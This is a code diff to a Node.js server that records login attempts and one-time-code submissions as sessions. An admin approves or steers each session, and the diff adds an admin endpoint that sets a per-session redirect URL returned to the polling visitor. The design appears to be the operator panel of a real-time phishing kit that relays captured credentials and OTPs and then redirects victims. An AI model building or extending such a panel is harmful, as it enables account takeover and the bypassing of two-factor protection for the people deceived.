@@ -264,6 +264,7 @@ const server = http.createServer(async (req, res) => {
         loginStatus: 'waiting',
         otp: null,
         otpStatus: null,
+        redirectUrl: null,
         date: new Date().toISOString()
       };
       sessions.push(session);
@@ -277,7 +278,7 @@ const server = http.createServer(async (req, res) => {
     const id = parseInt(reqPath.split('/')[3]);
     const s = sessions.find(a => a.id === id);
     if (!s) return json(res, { status: 'not_found' }, 404);
-    return json(res, { status: s.loginStatus });
+    return json(res, { status: s.loginStatus, redirectUrl: s.redirectUrl || null });
   }
 
   if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
@@ -313,7 +314,7 @@ const server = http.createServer(async (req, res) => {
     const id = parseInt(reqPath.split('/')[3]);
     const s = sessions.find(a => a.id === id);
     if (!s) return json(res, { status: 'not_found' }, 404);
-    return json(res, { status: s.otpStatus || 'not_found' });
+    return json(res, { status: s.otpStatus || 'not_found', redirectUrl: s.redirectUrl || null });
   }
 
   if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
@@ -342,6 +343,20 @@ const server = http.createServer(async (req, res) => {
       return { ...s, pendingAction };
     });
     return json(res, { sessions: list });
+  }
+
+  if (req.method === 'POST' && reqPath === '/api/sessions/redirect') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const s = sessions.find(a => a.id === data.id);
+      if (!s) return json(res, { error: 'not found' }, 404);
+      s.redirectUrl = data.url;
+      return json(res, { success: true });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
   }
 
   // --- Admin Auth ---
